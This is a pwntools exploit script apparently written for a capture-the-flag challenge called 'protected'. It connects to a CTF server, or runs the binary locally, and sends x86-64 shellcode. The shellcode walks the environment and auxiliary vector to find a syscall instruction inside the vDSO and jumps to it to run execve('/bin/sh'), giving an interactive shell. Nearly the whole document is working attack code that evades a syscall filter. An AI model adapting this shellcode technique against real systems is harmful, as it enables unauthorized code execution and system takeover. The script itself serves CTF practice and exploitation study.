from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./protected"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("he-protecc.challs.cornc.tf", 1337, ssl=True)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

environ = 0x4d58d0
base_addr = 0x500000
binsh_offset = 0x50
binsh_addr = base_addr + binsh_offset

shellcode = asm(f"""
mov r8, [{environ}]
.loop_env:
    add r8, 8
    mov r9, [r8]
    sub r9, 0x21
    test r9, r9
    jne .loop_env
add r8, 8
mov r8, [r8]    
.loop_vdso:
    add r8, 1
    xor rax, rax
    mov ax, word ptr [r8]
    sub rax, 0x50f
    test rax, rax
    jne .loop_vdso

mov rdi, {binsh_addr}
xor rsi, rsi
xor rdx, rdx
mov rax, 59
jmp r8
""")

shellcode = shellcode.ljust(binsh_offset, b'\x90') + b'/bin/sh\x00'
payload = shellcode
log.success(disasm(shellcode))

io.sendlineafter("How long is your shellcode?\n", str(len(payload)))
ddebug("b *0x04033CA\n b *0x500fe0\n continue")
io.sendline(payload)

io.interactive()
